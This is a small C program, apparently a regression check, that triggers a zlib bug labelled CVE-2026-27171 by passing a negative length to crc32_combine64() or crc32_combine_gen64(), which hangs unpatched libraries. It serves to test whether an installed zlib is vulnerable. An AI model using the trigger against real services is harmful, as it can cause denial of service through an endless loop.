/* CVE-2026-27171: crc32_combine64() / crc32_combine_gen64() with a negative
 * length never return on unpatched zlib (infinite loop). Linked dynamically,
 * so it exercises whatever libz the image it runs in provides.
 * _LARGEFILE64_SOURCE is required for zlib.h to declare the *64 functions;
 * without it the call silently passes a 32-bit int and the bug is not reached. */
#define _LARGEFILE64_SOURCE 1
#include <stdio.h>
#include <zlib.h>
int main(int argc, char **argv) {
    z_off64_t neg = (z_off64_t)-1;
    if (argc > 1 && argv[1][0] == 'g') {
        printf("gen64(-1) = %lu\n", (unsigned long)crc32_combine_gen64(neg));
    } else {
        printf("combine64(-1) = %lu\n", (unsigned long)crc32_combine64(1UL, 2UL, neg));
    }
    return 0;
}
